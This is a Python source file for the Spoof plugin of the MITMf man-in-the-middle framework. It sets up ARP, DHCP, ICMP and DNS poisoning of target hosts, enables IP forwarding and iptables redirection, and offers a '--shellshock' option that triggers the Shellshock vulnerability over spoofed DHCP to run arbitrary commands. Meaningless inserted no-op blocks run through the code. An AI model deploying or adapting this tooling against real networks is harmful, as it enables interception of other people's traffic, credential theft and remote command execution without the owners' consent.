from plugins.plugin import Plugin

class Spoof(Plugin):
    name = 'Spoof'
    optname = 'spoof'
    desc = 'Redirect/Modify traffic using ICMP, ARP, DHCP or DNS'
    version = '0.6'

    def initialize(self, options):
        if False:
            while True:
                i = 10
        'Called if plugin is enabled, passed the options namespace'
        self.options = options
        self.protocol_instances = []
        from core.utils import iptables, shutdown, set_ip_forwarding
        debug = False
        if options.arp:
            if not options.gateway:
                shutdown('[Spoof] --arp argument requires --gateway')
            from core.poisoners.ARP import ARPpoisoner
            arp = ARPpoisoner(options)
            arp.debug = debug
            self.tree_info.append('ARP spoofing enabled')
            self.protocol_instances.append(arp)
        elif options.dhcp:
            from core.poisoners.DHCP import DHCPpoisoner
            if options.targets:
                shutdown('[Spoof] --targets argument invalid when DCHP spoofing')
            dhcp = DHCPpoisoner(options)
            dhcp.debug = debug
            self.tree_info.append('DHCP spoofing enabled')
            self.protocol_instances.append(dhcp)
        elif options.icmp:
            from core.poisoners.ICMP import ICMPpoisoner
            if not options.gateway:
                shutdown('[Spoof] --icmp argument requires --gateway')
            if not options.targets:
                shutdown('[Spoof] --icmp argument requires --targets')
            icmp = ICMPpoisoner(options)
            icmp.debug = debug
            self.tree_info.append('ICMP spoofing enabled')
            self.protocol_instances.append(icmp)
        if options.dns:
            self.tree_info.append('DNS spoofing enabled')
            if iptables().dns is False and options.filter is None:
                iptables().DNS(self.config['MITMf']['DNS']['port'])
        if not options.arp and (not options.icmp) and (not options.dhcp) and (not options.dns):
            shutdown('[Spoof] Spoof plugin requires --arp, --icmp, --dhcp or --dns')
        set_ip_forwarding(1)
        if iptables().http is False and options.filter is None:
            iptables().HTTP(options.listen_port)
        for protocol in self.protocol_instances:
            protocol.start()

    def options(self, options):
        if False:
            for i in range(10):
                print('nop')
        group = options.add_mutually_exclusive_group(required=False)
        group.add_argument('--arp', dest='arp', action='store_true', help='Redirect traffic using ARP spoofing')
        group.add_argument('--icmp', dest='icmp', action='store_true', help='Redirect traffic using ICMP redirects')
        group.add_argument('--dhcp', dest='dhcp', action='store_true', help='Redirect traffic using DHCP offers')
        options.add_argument('--dns', dest='dns', action='store_true', help='Proxy/Modify DNS queries')
        options.add_argument('--netmask', dest='netmask', type=str, default='255.255.255.0', help='The netmask of the network')
        options.add_argument('--shellshock', type=str, metavar='PAYLOAD', dest='shellshock', help='Trigger the Shellshock vuln when spoofing DHCP, and execute specified command')
        options.add_argument('--gateway', dest='gateway', help='Specify the gateway IP')
        options.add_argument('--gatewaymac', dest='gatewaymac', help='Specify the gateway MAC [will auto resolve if ommited]')
        options.add_argument('--targets', dest='targets', help='Specify host/s to poison [if ommited will default to subnet]')
        options.add_argument('--ignore', dest='ignore', help='Specify host/s not to poison')
        options.add_argument('--arpmode', type=str, dest='arpmode', default='rep', choices=['rep', 'req'], help='ARP Spoofing mode: replies (rep) or requests (req) [default: rep]')

    def on_shutdown(self):
        if False:
            for i in range(10):
                print('nop')
        from core.utils import iptables, set_ip_forwarding
        for protocol in self.protocol_instances:
            if hasattr(protocol, 'stop'):
                protocol.stop()
        iptables().flush()
        set_ip_forwarding(0)